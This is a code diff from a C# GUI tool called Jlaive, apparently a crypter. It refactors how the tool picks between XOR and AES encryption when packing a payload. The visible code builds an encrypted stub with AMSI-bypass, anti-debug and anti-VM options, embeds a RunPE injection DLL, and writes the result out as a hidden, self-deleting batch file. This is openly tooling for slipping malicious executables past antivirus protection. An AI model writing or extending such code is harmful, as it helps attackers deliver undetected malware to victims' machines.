@@ -31,7 +31,7 @@ namespace Jlaive
 
         private void buildButton_Click(object sender, EventArgs e)
         {
-            Task.Factory.StartNew(Crypt);
+            Crypt();
         }
 
         private void Form1_Load(object sender, EventArgs e)
@@ -118,7 +118,7 @@ namespace Jlaive
             byte[] _iv = Convert.FromBase64String(iv1.Text);
             byte[] _stubkey = Convert.FromBase64String(key2.Text);
             byte[] _stubiv = Convert.FromBase64String(iv6.Text);
-            bool _usexor = xorEncryption.Checked;
+            EncryptionMode mode = xorEncryption.Checked ? EncryptionMode.XOR : EncryptionMode.AES;
             if (!File.Exists(_input))
             {
                 MessageBox.Show("Invalid input path.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
@@ -147,10 +147,10 @@ namespace Jlaive
             }
 
             listBox2.Items.Add("Encrypting payload...");
-            byte[] payload_enc = Encrypt(Compress(pbytes), _stubkey, _stubiv, _usexor);
+            byte[] payload_enc = Encrypt(mode, Compress(pbytes), _stubkey, _stubiv);
 
             listBox2.Items.Add("Creating stub...");
-            string stub = StubGen.CreateCS(_stubkey, _stubiv, _usexor, bypassAMSI.Checked, antiDebug.Checked, antiVM.Checked, !isnetasm, rng);
+            string stub = StubGen.CreateCS(_stubkey, _stubiv, mode, bypassAMSI.Checked, antiDebug.Checked, antiVM.Checked, !isnetasm, rng);
 
             listBox2.Items.Add("Building stub...");
             string tempfile = Path.GetTempFileName();
@@ -158,7 +158,7 @@ namespace Jlaive
             if (!isnetasm)
             {
                 byte[] runpedll_data = GetEmbeddedResource("Jlaive.Resources.runpe.dll");
-                byte[] runpedll_enc = Encrypt(Compress(runpedll_data), _stubkey, _stubiv, _usexor);
+                byte[] runpedll_enc = Encrypt(mode, Compress(runpedll_data), _stubkey, _stubiv);
                 File.WriteAllBytes("runpe.dll", runpedll_enc);
             }
             CSharpCodeProvider csc = new CSharpCodeProvider();
@@ -189,10 +189,10 @@ namespace Jlaive
             File.Delete(tempfile);
 
             listBox2.Items.Add("Encrypting stub...");
-            byte[] stub_enc = Encrypt(Compress(stubbytes), _key, _iv, _usexor);
+            byte[] stub_enc = Encrypt(mode, Compress(stubbytes), _key, _iv);
 
             listBox2.Items.Add("Creating batch file...");
-            string content = FileGen.CreateBat(_key, _iv, _usexor, hidden.Checked, selfDelete.Checked, rng);
+            string content = FileGen.CreateBat(_key, _iv, mode, hidden.Checked, selfDelete.Checked, rng);
             content += Convert.ToBase64String(stub_enc);
 
             listBox2.Items.Add("Writing output...");
